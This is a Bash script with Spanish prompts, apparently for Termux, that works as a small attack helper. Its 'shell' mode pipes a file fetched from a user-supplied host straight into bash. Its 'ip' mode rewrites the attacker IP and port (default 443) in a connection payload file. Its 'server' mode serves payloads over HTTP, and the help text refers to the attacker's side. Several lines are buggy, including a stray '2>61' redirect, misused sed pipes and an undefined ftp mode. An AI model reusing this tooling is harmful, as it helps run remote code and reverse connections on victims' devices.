#!/bin/bash
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquesaColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[!]Saliendo...${endColour}"; tput cnorm; cat conexion | cut -d '/' -f 5 | awk '{print $1}' | sed -i s/$cambio_puerto/443/g conexion; exit 1
}

function fichero_conexion(){
	echo -en "\n${blueColour}[*]${endColour}${greenColour}Ip ahora:$(cat conexion | cut  -d '/' -f  4 )\n==>${endColour} "; tput cnorm && read ip_antigua
	echo -en "\n${blueColour}[*]${endCOlour}${greenColour}Ip nueva: \n==> ${endColour}"; tput cnorm && read ip_nueva
	cat conexion | cut  -d '/' -f  4 | sed -i s/$ip_antigua/$ip_nueva/g conexion
	echo -en "\n${yellowColour}[!]${endColour}Cambiar puerto de escucha (443):\n" && read cambio_puerto

	if [ ! "$(echo $cambio_puerto)" ]; then
		cambio_puerto=443
	else
		cat conexion | cut -d '/' -f 5 | awk '{print $1}' | sed -i s/443/$cambio_puerto/g conexion
	fi

	echo -e "\n${turquesaColour}[?]${endColour}${purpleColour}Fichero listo${endColour}"
	tput civis
}

function shell(){
	echo -en "${yellowColour}[?]${endColour}Introduce Ip:\n${blueColour}==>${endColour}" && read ip
	echo -en "${yellowColour}[?]${endColour}Introduce Puerto:\n${blueColour}==>${endColour}" && read puerto
	echo -en "${yellowColour}[?]${endColour}Introduce Nombre de Fichero:\n${blueColour}==>${endColour}" && read fichero
	curl http://$ip:$puerto/$fichero | bash
}
function server(){
	echo -e "\n${turquesaColour}[?]${endColour}Montando el Servidor (80)"
	xterm -hold -e "python3 -m http.server 80" & > /dev/null 2>61
	python_server=$!
	sleep 60; kill -9 $python_server
}

function Panel_ayuda(){
	echo -e "\n${yellowColour}[Uso de la Herameinta]${endColour}\n"
	echo -e "\n${blueColour}[!]${endColour}Tener un servidor montado en python del Lado del Atacante"
	echo -e "\n${redColour}[-m]${endColour}\tModo (luz/ftp/ip/shell/server)"
	echo -e "\n${redColour}[-l]${endColour}\tEstado linterna (on/off)"
	echo -e "\n${redColour}[-h]${endColour}\tPanel Ayuda"
}

function linterna(){
	if [ $luz == "on" ]; then
         echo -e "\n${blueColour}[*]${endColour}${redColour}Encendiendo la luz${endColour}"
    elif [ $luz == "off" ]; then
         echo -e "\n${blueColour}[*]${endColour}${redColour}Apagando la luz${endColour}"
    fi

}

parametro_contador=0;while getopts "l:f:m:h:" arg;do
	case $arg in
		l) luz=$OPTARG;let parametro_contador+=1;;
#		f) ftp=$OPTARG;let parametro_contador+=1;;
		m) modo=$OPTARG;let parametro_contador+=1;;
		h) Panel_ayuda;;
	esac
done

tput civis

if [ $parametro_contador -eq 0 ]; then
	Panel_ayuda
else
	if [ "$(echo $modo)" == "luz" ]; then
		linterna
	elif [ "$(echo $modo)" == "ftp" ]; then
		ftp
	elif [ "$(echo $modo)" == "ip" ]; then
		fichero_conexion ; cat conexion | cut -d '/' -f 5 | awk '{print $1}' | sed -i s/$cambio_puerto/443/g conexion ; exit 1
	elif [ "$(echo $modo)" == "shell" ]; then
		shell
	elif [ "$(echo $modo)" == "server" ]; then
		server
	fi
fi

## EN termux para hacernos un xterm -hold -e 'python3 -m http.server 80' & > /dev/null 2>61
## Deberemos instlar aterm por un lado (pkg install aterm) y también despues hay que correr (pkg in x11-repo) 
## Si no funciona mejor es antes actualizar el sistema de termux para ello lo haremos con
## apt-get update y apt-get upgrade

